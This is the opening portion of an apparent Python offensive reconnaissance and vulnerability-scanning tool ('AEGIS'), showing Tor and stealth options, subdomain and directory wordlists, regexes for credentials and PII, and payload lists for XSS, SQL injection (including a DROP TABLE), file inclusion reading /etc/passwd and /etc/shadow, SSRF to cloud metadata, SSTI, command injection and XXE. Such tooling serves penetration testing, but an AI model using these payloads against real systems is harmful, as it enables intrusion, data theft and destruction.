#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  AEGIS v12.0 — SILENTIUM v12                                             ║
║  Advanced Exploration & Gathering Intelligence System                        ║
║  The Ultimate Offensive Reconnaissance Framework                             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Modules: Crawler · VulnScanner · OSINT · DNS · SSL · Ports · Subdomains   ║
║           TechDetection · SecretExtraction · ML-Scoring · Report            ║
╚══════════════════════════════════════════════════════════════════════════════╝

Usage:
  python3 aegis.py -t https://target.com [options]

Core Flags:
  -t, --target URL        Target URL or IP (required)
  --threads N             Concurrency level (default: 50)
  --depth N               Crawl depth (default: 3)
  --timeout N             Request timeout seconds (default: 10)
  --output DIR            Output directory

Feature Flags:
  --full                  Enable ALL modules
  --ml                    ML-based risk scoring
  --distributed           Distributed worker mode
  --stealth               Low-and-slow evasive mode
  --tor                   Route through Tor (localhost:9050)
  --wordlist FILE         Custom wordlist

OSINT Keys:
  --shodan KEY            Shodan API key
  --vt KEY                VirusTotal API key
  --censys-id ID          Censys API ID
  --censys-secret S       Censys API secret
  --greynoise KEY         GreyNoise API key
  --hunter KEY            Hunter.io API key
  --securitytrails KEY    SecurityTrails API key

Proxy:
  --proxy URL             HTTP/SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)
"""

# ════════════════════════════════════════════════════════
# STDLIB IMPORTS
# ════════════════════════════════════════════════════════
import sys
import os
import re
import json
import time
import math
import uuid
import gzip
import base64
import hashlib
import asyncio
import logging
log = logging.getLogger(__name__)
import inspect
import argparse
import ipaddress
import platform
import threading
import subprocess
import importlib
import importlib.util
import socket
import ssl
import random
import signal
import traceback
import contextlib
import collections
import copy
import io
import csv
import shutil
import tempfile
import struct
import xml.etree.ElementTree as ET
from typing import (
    Any, Dict, List, Optional, Set, Tuple, Union,
    AsyncGenerator, Callable, Iterator
)
from pathlib import Path
from datetime import datetime, timezone, timedelta
from collections import defaultdict, Counter, deque
from dataclasses import dataclass, field, asdict
from functools import wraps, lru_cache
from contextlib import asynccontextmanager, suppress
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import (
    urlparse, urljoin, urlencode, parse_qs, quote,
    unquote, urlunparse, parse_qsl
)
import html as html_lib
import itertools
import queue
import weakref

# ════════════════════════════════════════════════════════
# OPTIONAL DEPENDENCY LOADING
# ════════════════════════════════════════════════════════
# Runtime pip install removed: non-reproducible, supply-chain risk.
# Install all dependencies before launch: pip install -r requirements.txt

def _imp(mod: str, pip_pkg: str = None, attr: str = None):
    """Import an optional module; return None (not install) if unavailable."""
    pkg_hint = pip_pkg or mod
    try:
        m = importlib.import_module(mod)
        return getattr(m, attr) if attr else m
    except ImportError:
        import logging as _ilog
        _ilog.getLogger("aegis.node").debug(
            "Optional dependency unavailable: %s (install with: pip install %s)",
            mod, pkg_hint
        )
        return None

# Optional libraries
aiohttp       = _imp("aiohttp")
aiofiles      = _imp("aiofiles")
dns_res       = _imp("dns.resolver",  "dnspython",    "resolver")
dns_zone      = _imp("dns.zone",      "dnspython",    "zone")
dns_query     = _imp("dns.message",   "dnspython",    "message")
dns_exc       = _imp("dns.exception", "dnspython",    "exception")
whois_lib     = _imp("whois",         "python-whois")
OpenSSL_crypt = _imp("OpenSSL.crypto","pyOpenSSL",    "crypto")
OpenSSL_SSL   = _imp("OpenSSL.SSL",   "pyOpenSSL",    "SSL")
bs4_mod       = _imp("bs4",           "beautifulsoup4")
BeautifulSoup = getattr(bs4_mod, "BeautifulSoup", None) if bs4_mod else None
lxml_html     = _imp("lxml.html",     "lxml")
_skl_sgd      = _imp("sklearn.linear_model",   "scikit-learn", "SGDClassifier")
_skl_scl      = _imp("sklearn.preprocessing",  "scikit-learn", "StandardScaler")
_skl_fe       = _imp("sklearn.feature_extraction.text","scikit-learn","TfidfVectorizer")
numpy         = _imp("numpy")
uvloop_mod    = _imp("uvloop")

if uvloop_mod:
    try:
        import uvloop
        asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
    except Exception as _exc:
        log.debug("unknown: %s", _exc)

# Rich console
_rich = _imp("rich")
if _rich:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import (
        Progress, SpinnerColumn, TextColumn, BarColumn,
        TaskProgressColumn, TimeElapsedColumn, MofNCompleteColumn
    )
    from rich.markup import escape as _re
    CONSOLE = Console(highlight=False)
    HAS_RICH = True
else:
    HAS_RICH = False
    class _FallbackConsole:
        def print(self, *a, **k):
            m = " ".join(str(x) for x in a)
            print(re.sub(r'\[/?[a-z_ ]+\]', '', m))
        def log(self, *a, **k): self.print(*a)
        def rule(self, *a, **k): print("─" * 70)
    CONSOLE = _FallbackConsole()
    def _re(s): return s

def cprint(*args, **kw): CONSOLE.print(*args, **kw)

# ════════════════════════════════════════════════════════
# VERSION & METADATA
# ════════════════════════════════════════════════════════
VERSION   = "3.0.0"
CODENAME  = "LEGENDARY"
BUILD     = "2026-03-10"

BANNER = f"""
[bold cyan]╔══════════════════════════════════════════════════════════════╗
║  AEGIS v{VERSION} [{CODENAME}]  — Reconnaissance Framework     ║
║  Build {BUILD} · Python {platform.python_version()}                           ║
╚══════════════════════════════════════════════════════════════╝[/bold cyan]"""

# ════════════════════════════════════════════════════════
# EMBEDDED WORDLISTS
# ════════════════════════════════════════════════════════

SUBDOMAIN_WORDLIST = [
    "www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
    "vpn","m","shop","ftp","mail2","test","portal","ns","ww1","host","support",
    "dev","web","bbs","ww42","mx","email","cloud","1","mail1","2","forum","owa",
    "www2","gw","admin","store","mx1","cdn","api","exchange","app","2tty","vps",
    "govyty","hrt","ww3","enews","station","intranet","auth","db","staging","beta",
    "demo","pre","preprod","uat","qa","testing","sandbox","dev2","devtest","internal",
    "corp","vpn2","remote2","extranet","gateway","proxy","router","firewall","load",
    "lb","backend","frontend","microservice","service","services","api2","apiv2",
    "v1","v2","v3","graphql","rest","soap","rpc","ws","websocket","static","assets",
    "media","files","uploads","downloads","content","images","img","css","js","fonts",
    "icons","storage","s3","bucket","blob","backup","db2","mysql","postgres","redis",
    "mongo","elastic","kibana","grafana","prometheus","jenkins","gitlab","github",
    "git","svn","jira","confluence","wiki","docs","documentation","help","helpdesk",
    "support2","ticket","hr","crm","erp","bi","analytics","reports","data","warehouse",
    "etl","pipeline","kafka","rabbit","queue","worker","scheduler","cron","monitor",
    "nagios","zabbix","munin","status","health","ping","alive","heartbeat","metrics",
    "logs","logging","audit","siem","sso","oauth","idp","saml","ldap","ad","directory",
    "iam","pam","vault","secrets","cert","certs","pki","ca","pay","payment","checkout",
    "cart","billing","invoice","subscription","license","activation","download",
    "software","update","upgrade","patch","release","version","changelog","news",
    "about","contact","careers","jobs","press","partners","affiliates",
]

DIR_WORDLIST = [
    "admin","login","wp-admin","administrator","dashboard","panel","manage","control",
    "backend","cms","phpmyadmin","database","db","sql","mysql","config","configuration",
    "setup","install","installer","update","upgrade","backup","backups","bak","old",
    "temp","tmp","cache","logs","log","error","errors","debug","test","tests","dev",
    "api","api/v1","api/v2","graphql","rest","swagger","docs","documentation","help",
    "robots.txt","sitemap.xml","sitemap","crossdomain.xml",".htaccess",".env",
    ".git","git","svn",".svn",".DS_Store","web.config","wp-config.php","config.php",
    "configuration.php","settings.php","database.php","db.php","conn.php",
    "connect.php","connection.php","include","includes","inc","lib","library",
    "libraries","vendor","node_modules","assets","static","public","private","secret",
    "secrets","hidden","upload","uploads","files","file","download","downloads",
    "media","images","img","photos","gallery","css","js","scripts","style","styles",
    "template","templates","theme","themes","plugin","plugins","module","modules",
    "component","components","user","users","account","accounts","member","members",
    "profile","profiles","register","registration","signup","signin","logout","auth",
    "authentication","oauth","password","reset","forgot","change","verify","activate",
    "index","index.php","index.html","index.asp","index.aspx","default","home","main",
    "portal","app","application","search","find","query","result","results","data",
    "export","import","report","reports","invoice","payment","checkout","cart","shop",
    "store","product","products","category","categories","tag","tags","post","posts",
    "article","articles","news","blog","forum","comment","comments","message",
    "messages","inbox","outbox","chat","contact","about","team","jobs","career",
    "careers","press","partner","partners","affiliate","affiliates","terms","privacy",
    "legal","license","license.txt","readme","README.md","CHANGELOG","todo",
    "phpinfo.php","info.php","test.php","demo","examples","sample","samples",
    "cgi-bin","cgi","scripts","bin","shell","cmd","exec","run","process",
    "server-status","server-info","_admin","_login","wp-login","wp-json",
    "xmlrpc.php","feed","rss","atom","subscribe","unsubscribe","newsletter",
]

# ════════════════════════════════════════════════════════
# REGEX PATTERNS — SECRETS / PII / TECH
# ════════════════════════════════════════════════════════

PATTERNS: Dict[str, re.Pattern] = {
    "aws_access_key":     re.compile(r'AKIA[0-9A-Z]{16}'),
    "aws_secret_key":     re.compile(r'(?i)aws[_\-\s]?secret[_\-\s]?(?:access[_\-\s]?)?key[\s"\'=:]+([A-Za-z0-9/+]{40})'),
    "aws_session_token":  re.compile(r'AQoD[A-Za-z0-9/+=]{100,}'),
    "gcp_api_key":        re.compile(r'AIza[0-9A-Za-z\-_]{35}'),
    "gcp_service_acct":   re.compile(r'"type"\s*:\s*"service_account"'),
    "azure_conn_str":     re.compile(r'DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{88}'),
    "github_token":       re.compile(r'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|ghs_[A-Za-z0-9]{36}'),
    "github_oauth":       re.compile(r'[Gg]it[Hh]ub[_\s\-]?[Oo]auth[_\s\-]?[Tt]oken[\s"\'=:]+([a-z0-9]{40})'),
    "stripe_live_key":    re.compile(r'sk_live_[0-9a-zA-Z]{24,}'),
    "stripe_pub_key":     re.compile(r'pk_live_[0-9a-zA-Z]{24,}'),
    "stripe_secret":      re.compile(r'rk_live_[0-9a-zA-Z]{24,}'),
    "slack_token":        re.compile(r'xox[baprs]-[0-9]{10,12}-[0-9]{10,12}-[0-9a-zA-Z]{24}'),
    "slack_webhook":      re.compile(r'https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[a-zA-Z0-9]+'),
    "twilio_sid":         re.compile(r'AC[a-z0-9]{32}'),
    "twilio_auth":        re.compile(r'(?i)twilio[_\s\-]?auth[_\s\-]?token[\s"\'=:]+([a-f0-9]{32})'),
    "sendgrid_key":       re.compile(r'SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}'),
    "mailgun_key":        re.compile(r'key-[0-9a-zA-Z]{32}'),
    "square_access":      re.compile(r'sq0atp-[0-9A-Za-z\-_]{22}'),
    "square_oauth":       re.compile(r'sq0csp-[0-9A-Za-z\-_]{43}'),
    "google_oauth":       re.compile(r'ya29\.[0-9A-Za-z\-_]{68,}'),
    "heroku_api_key":     re.compile(r'[Hh]eroku[_\s\-]?[Aa]pi[_\s\-]?[Kk]ey[\s"\'=:]+([0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12})'),
    "digitalocean_token": re.compile(r'dop_v1_[a-f0-9]{64}'),
    "npm_token":          re.compile(r'npm_[A-Za-z0-9]{36}'),
    "jwt_token":          re.compile(r'eyJ[A-Za-z0-9\-_=]+\.eyJ[A-Za-z0-9\-_=]+\.[A-Za-z0-9\-_.+/=]+'),
    "rsa_private_key":    re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
    "pgp_private_key":    re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----'),
    "generic_secret":     re.compile(r'(?i)(?:secret|api_key|apikey|token|auth)[\s"\'=:]+["\']([^"\']{8,64})["\']'),
    "generic_password":   re.compile(r'(?i)(?:password|passwd|pwd)[\s"\'=:]+([^\s"\'<>{]{6,})'),
    "db_connection":      re.compile(r'(?i)(?:mysql|postgres|mongodb|redis|mssql|oracle|mariadb)://[^@\s]+@[^\s]+'),
    "email":              re.compile(r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}\b'),
    "phone_us":           re.compile(r'\b(?:\+1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b'),
    "ssn":                re.compile(r'\b(?!000|666|9\d{2})\d{3}-(?!00)\d{2}-(?!0000)\d{4}\b'),
    "credit_card":        re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6(?:011|5[0-9]{2})[0-9]{12})\b'),
    "ipv4":               re.compile(r'\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b'),
    "internal_ip":        re.compile(r'\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b'),
    "cloud_metadata":     re.compile(r'169\.254\.169\.254'),
    "aws_arn":            re.compile(r'arn:aws:[a-z0-9\-]+:[a-z0-9\-]*:[0-9]{12}:[^\s]+'),
    "s3_bucket":          re.compile(r'[a-z0-9\-\.]{3,63}\.s3(?:[.-][a-z0-9\-]+)?\.amazonaws\.com'),
    "firebase_url":       re.compile(r'https://[a-z0-9\-]+\.firebaseio\.com'),
    "sql_error":          re.compile(r'(?i)(?:sql syntax|mysql error|ORA-\d+|syntax error.*sql|unclosed quotation|PG::SyntaxError|SQLiteException|PSQLException)'),
    "stack_trace":        re.compile(r'(?i)(?:Traceback \(most recent call last\)|at\s+\S+\.\S+\(.*:\d+\)|Exception in thread)'),
    "debug_info":         re.compile(r'(?i)(?:debug mode|xdebug|whoops|symfony exception|laravel.*debug|rails.*debug)'),
    "path_disclosure":    re.compile(r'(?i)(?:/home/[a-z]+/|/var/www/|/usr/local/|C:\\(?:inetpub|www|Users)\\[^<>\s]+)'),
}

# ════════════════════════════════════════════════════════
# VULNERABILITY PAYLOADS
# ════════════════════════════════════════════════════════

PAYLOADS: Dict[str, List[str]] = {
    "xss": [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<svg onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        'javascript:alert(1)',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<<SCRIPT>alert(1);//<</SCRIPT>',
        '<math><mtext></table><mglyph><style><!--</style><img title="-->" src onerror=alert(1)>',
        '{{constructor.constructor(\'alert(1)\')()}}',
        '"><details/open/ontoggle=confirm(1)>',
    ],
    "sqli": [
        "'", '"', "' OR '1'='1", "' OR 1=1--", "' OR 1=1#",
        "' OR 1=1/*", '" OR "1"="1', "') OR ('1'='1",
        "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
        "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--",
        "1 UNION SELECT NULL,NULL,NULL--",
        "' AND 1=1--", "' AND 1=2--",
        "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
        "1 AND 1=1", "1 AND 1=2",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT VERSION())))--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin')--",
        "'; DROP TABLE users--",
    ],
    "lfi": [
        "../../../../etc/passwd",
        "../../../../etc/shadow",
        "../../../../etc/hosts",
        "../../../../proc/version",
        "../../../../proc/self/environ",
        "../../../../windows/win.ini",
        "../../../../windows/system32/drivers/etc/hosts",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252F..%252Fetc%252Fpasswd",
        "/etc/passwd%00",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/read=string.rot13/resource=index.php",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "expect://id",
        "file:///etc/passwd",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/user-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://192.168.0.1/",
        "http://localhost/",
        "http://127.0.0.1/",
        "http://[::1]/",
        "http://0.0.0.0/",
        "http://2130706433/",
        "http://0177.0.0.01/",
        "http://0x7f000001/",
        "dict://localhost:6379/info",
        "sftp://localhost:22",
        "ldap://localhost:389",
        "gopher://localhost:80/",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
        "{{7*'7'}}", "${7*'7'}",
        "{{config}}", "{{self}}", "{{request}}",
        "@{7*7}", "#set($x=7*7)${x}",
        "<%=7*7%>", "[[${7*7}]]",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
    ],
    "open_redirect": [
        "//evil.com", "//evil.com/", "\\\\evil.com", "///evil.com",
        "http://evil.com", "https://evil.com",
        "//google.com/%40target.com",
        "/%5Cevil.com", "/%09/evil.com", "/\\evil.com",
        "javascript:alert(1)",
        "/https://evil.com",
    ],
    "cmd_injection": [
        "; id", "| id", "& id", "&& id", "|| id",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "`id`", "$(id)", "$(cat /etc/passwd)",
        "; sleep 5", "| sleep 5", "& sleep 5",
        "\n id", "%0a id", "%0d id",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
    ],
    "path_traversal": [
        "../", "../../", "../../../", "../../../../",
        "..\\", "..\\..\\", "..\\..\\..\\",
        "%2e%2e%2f", "%2e%2e%5c",
        "..%2f", "..%5c", "%252e%252e%252f",
    ],
}

# ════════════════════════════════════════════════════════
# TECHNOLOGY FINGERPRINTS
# ════════════════════════════════════════════════════════

TECH_SIGS: Dict[str, Dict[str, List[str]]] = {
    "WordPress": {
        "html":    [r'/wp-content/', r'/wp-includes/', r'wp-json', r'wp-login\.php'],
        "headers": [],
        "cookies": [r'wordpress_logged_in', r'wp-settings-'],
        "meta":    [r'generator.*WordPress'],
    },
    "Drupal": {
        "headers": [r'X-Generator.*Drupal', r'X-Drupal-'],
        "html":    [r'/sites/default/files/', r'Drupal\.settings', r'/misc/drupal\.js'],
        "cookies": [r'SESS[a-f0-9]{32}'],
        "meta":    [r'generator.*Drupal'],
    },
    "Joomla": {
        "html":    [r'/media/jui/', r'joomla'],
        "headers": [], "cookies": [], "meta": [r'generator.*Joomla'],
    },
    "Laravel": {
        "html":    [r'laravel_session', r'csrf-token'],
        "headers": [], "cookies": [r'laravel_session', r'XSRF-TOKEN'], "meta": [],
    },
    "Django": {
        "html":    [r'csrfmiddlewaretoken'],
        "headers": [], "cookies": [r'csrftoken', r'sessionid'], "meta": [],
    },
    "Ruby on Rails": {
        "headers": [r'X-Powered-By.*Phusion Passenger'],
        "html":    [r'csrf-param', r'authenticity_token'],
        "cookies": [r'_session_id', r'_rails_'], "meta": [],
    },
    "ASP.NET": {
        "headers": [r'X-Powered-By.*ASP\.NET', r'X-AspNet-Version'],
        "html":    [r'__VIEWSTATE', r'__EVENTVALIDATION'],
        "cookies": [r'ASP\.NET_SessionId', r'\.ASPXAUTH'], "meta": [],
    },
    "Express.js": {
        "headers": [r'X-Powered-By.*Express'],
        "html":    [], "cookies": [r'connect\.sid'], "meta": [],
    },
    "React": {
        "html":    [r'__next_data__', r'react-dom', r'data-reactroot', r'_reactFiber'],
        "headers": [], "cookies": [], "meta": [],
    },
    "Angular": {
        "html":    [r'ng-version', r'ng-app', r'\[ng-'],
        "headers": [], "cookies": [], "meta": [],
    },
    "Vue.js": {
        "html":    [r'data-v-[0-9a-f]+', r'__vue__', r'v-app'],
        "headers": [], "cookies": [], "meta": [],
    },
    "Nginx": {
        "headers": [r'Server.*nginx'], "html": [], "cookies": [], "meta": [],
    },
    "Apache": {
        "headers": [r'Server.*Apache'], "html": [], "cookies": [], "meta": [],
    },
    "IIS": {
        "headers": [r'Server.*Microsoft-IIS', r'X-Powered-By.*ASP'],
        "html": [], "cookies": [], "meta": [],
    },
    "Cloudflare": {
        "headers": [r'cf-ray', r'CF-Cache-Status', r'Server.*cloudflare'],
        "html": [], "cookies": [r'__cfduid', r'__cf_bm', r'cf_clearance'], "meta": [],
    },
    "AWS CloudFront": {
        "headers": [r'X-Cache.*CloudFront', r'Via.*CloudFront', r'x-amz-cf-id'],
        "html": [], "cookies": [], "meta": [],
    },
    "Akamai": {
        "headers": [r'X-Akamai-', r'AkamaiGHost'],
        "html": [], "cookies": [r'ak_bmsc'], "meta": [],
    },
    "ModSecurity": {
        "headers": [r'X-Mod-Security-'],
        "html": [r'mod_security', r'ModSecurity'], "cookies": [], "meta": [],
    },
    "phpMyAdmin": {
        "html":    [r'phpMyAdmin', r'PMA_'],
        "headers": [], "cookies": [r'phpMyAdmin', r'pma_'], "meta": [r'phpMyAdmin'],
    },
    "Elasticsearch": {
        "html":    [r'"cluster_name"', r'"You Know, for Search"'],
        "headers": [], "cookies": [], "meta": [],
    },
}

# ════════════════════════════════════════════════════════
# CONSTANTS
# ════════════════════════════════════════════════════════

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.2; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
]

SECURITY_HEADERS = {
    "strict-transport-security": "HSTS not set — vulnerable to SSL stripping/downgrade attacks",
    "content-security-policy":   "CSP not set — XSS exploitation is easier",
    "x-frame-options":           "X-Frame-Options not set — clickjacking possible",
    "x-content-type-options":    "X-Content-Type-Options not set — MIME sniffing possible",
    "referrer-policy":           "Referrer-Policy not set — may leak sensitive URLs in Referer header",
    "permissions-policy":        "Permissions-Policy not set — browser feature access unrestricted",
    "cross-origin-opener-policy":"COOP not set — cross-origin attacks possible",
    "cross-origin-resource-policy":"CORP not set — cross-origin resource inclusion possible",
    "cross-origin-embedder-policy":"COEP not set",
    "cache-control":             "Cache-Control not set — sensitive responses may be cached",
}

COMMON_PORTS = [
    21,22,23,25,53,80,110,111,135,139,143,443,445,465,587,631,993,995,
    1080,1433,1521,2049,2181,2375,2376,3000,3306,3389,4000,4444,4848,
    5000,5432,5601,5900,5984,6379,6443,7001,7474,8000,8008,8080,8081,
    8082,8088,8089,8161,8443,8888,9000,9001,9042,9090,9092,9200,9300,
    9418,9443,10000,11211,15672,27017,27018,28017,50000,61616,
]

PORT_SERVICES = {
    21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
    110:"POP3",111:"RPC",135:"MSRPC",139:"NetBIOS",143:"IMAP",
    443:"HTTPS",445:"SMB",465:"SMTPS",587:"SMTP-Submission",
    993:"IMAPS",995:"POP3S",1080:"SOCKS",1433:"MSSQL",1521:"Oracle",
    2049:"NFS",2181:"Zookeeper",2375:"Docker",2376:"Docker-TLS",
    3306:"MySQL",3389:"RDP",5432:"PostgreSQL",5601:"Kibana",
    5900:"VNC",5984:"CouchDB",6379:"Redis",6443:"Kubernetes",
    7001:"WebLogic",7474:"Neo4j",8080:"HTTP-Proxy",8443:"HTTPS-Alt",
    8888:"Jupyter",9000:"PHP-FPM",9042:"Cassandra",9200:"Elasticsearch",
    9418:"Git",11211:"Memcached",15672:"RabbitMQ-Mgmt",27017:"MongoDB",
    50000:"SAP",61616:"ActiveMQ",
}

SEVERITY_COLORS = {
    "critical": "bold red",
    "high":     "red",
    "medium":   "yellow",
    "low":      "cyan",
    "info":     "dim",
}

# ════════════════════════════════════════════════════════
# DATACLASSES
# ════════════════════════════════════════════════════════

@dataclass
class ScanConfig:
    target: str
    threads: int = 50
    depth: int = 3
    timeout: int = 10
    output_dir: Optional[Path] = None
    wordlist: Optional[Path] = None
    proxy: Optional[str] = None
    use_tor: bool = False
    stealth: bool = False
    full_scan: bool = False
    ml_enabled: bool = False
    distributed: bool = False
    shodan_key: Optional[str] = None
    vt_key: Optional[str] = None
    censys_id: Optional[str] = None
    censys_secret: Optional[str] = None
    greynoise_key: Optional[str] = None
    hunter_key: Optional[str] = None
    securitytrails_key: Optional[str] = None
    scan_ports: bool = True
    scan_subdomains: bool = True
    scan_vulns: bool = True
    scan_osint: bool = True
    scan_ssl: bool = True
    plugins_dir: Optional[Path] = None

    def __post_init__(self):
        if self.output_dir is None:
            safe = re.sub(r'[^\w\-.]', '_', urlparse(self.target).netloc or self.target)
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            self.output_dir = Path(f"aegis_{safe}_{ts}")
        self.output_dir = Path(self.output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        if self.use_tor:
            self.proxy = "socks5://127.0.0.1:9050"
        if self.stealth:
            self.threads = min(self.threads, 5)


@dataclass
class VulnResult:
    vuln_type:   str
    url:         str
    parameter:   str
    payload:     str
    evidence:    str
    severity:    str
    confidence:  str
    description: str = ""
    remediation: str = ""
    cve:         Optional[str] = None
    cvss:        Optional[float] = None


@dataclass
class Finding:
    category:   str
    key:        str
    value:      str
    source_url: str
    severity:   str = "info"
    context:    str = ""


@dataclass
class DNSRecord:
    record_type: str
    name:        str
    value:       str
    ttl:         int = 0


@dataclass
class PortResult:
    port:    int
    state:   str
    service: str = ""
    banner:  str = ""
    version: str = ""


@dataclass
class SubdomainResult:
    subdomain:    str
    ip_addresses: List[str] = field(default_factory=list)
    cnames:       List[str] = field(default_factory=list)
    source:       str = ""
    status_code:  int = 0
    alive:        bool = False
    technologies: List[str] = field(default_factory=list)


@dataclass
class TechResult:
    name:       str
    version:    Optional[str] = None
    confidence: int = 0
    category:   str = ""


@dataclass
class SSLResult:
    host:            str
    port:            int
    subject:         Dict[str, str] = field(default_factory=dict)
    issuer:          Dict[str, str] = field(default_factory=dict)
    san:             List[str] = field(default_factory=list)
    not_before:      str = ""
    not_after:       str = ""
    days_remaining:  int = 0
    cipher_suite:    str = ""
    tls_version:     str = ""
    key_bits:        int = 0
    key_type:        str = ""
    signature_algo:  str = ""
    is_expired:      bool = False
    is_self_signed:  bool = False
    supports_tls10:  bool = False
    supports_tls11:  bool = False
    supports_tls12:  bool = False
    supports_tls13:  bool = False
    hsts_present:    bool = False
    vulnerabilities: List[str] = field(default_factory=list)


@dataclass
class CrawlResult:
    url:           str
    status_code:   int
    content_type:  str = ""
    title:         str = ""
    links:         List[str] = field(default_factory=list)
    forms:         List[Dict] = field(default_factory=list)
    scripts:       List[str] = field(default_factory=list)
    comments:      List[str] = field(default_factory=list)
    emails:        List[str] = field(default_factory=list)
    response_time: float = 0.0
    size:          int = 0
    redirect_url:  str = ""
    headers:       Dict[str, str] = field(default_factory=dict)
    findings:      List[Finding] = field(default_factory=list)


@dataclass
class ScanResults:
    target:      str
    start_time:  str = ""
    end_time:    str = ""
    duration:    float = 0.0
    crawl:       List[CrawlResult] = field(default_factory=list)
    vulns:       List[VulnResult] = field(default_factory=list)
    findings:    List[Finding] = field(default_factory=list)
    dns:         List[DNSRecord] = field(default_factory=list)
    ports:       List[PortResult] = field(default_factory=list)
    subdomains:  List[SubdomainResult] = field(default_factory=list)
    ssl:         Optional[SSLResult] = None
    technologies:List[TechResult] = field(default_factory=list)
    osint:       Dict[str, Any] = field(default_factory=dict)
    graph_nodes: Set[str] = field(default_factory=set)
    graph_edges: List[Tuple[str, str]] = field(default_factory=list)
    ml_scores:   Dict[str, float] = field(default_factory=dict)
    whois:       Dict[str, Any] = field(default_factory=dict)

# ════════════════════════════════════════════════════════
# UTILITIES & HELPERS
# ════════════════════════════════════════════════════════

class RateLimiter:
    """Token-bucket rate limiter for async code."""
    def __init__(self, rate: float, burst: int = 1):
        self.rate  = rate
        self.burst = burst
        self._tokens = float(burst)
        self._last   = time.monotonic()
        self._lock   = asyncio.Lock()

    async def acquire(self):
        async with self._lock:
            now = time.monotonic()
            self._tokens = min(
                self.burst,
                self._tokens + (now - self._last) * self.rate
            )
            self._last = now
            if self._tokens < 1:
                await asyncio.sleep((1 - self._tokens) / self.rate)
                self._tokens = 0.0
            else:
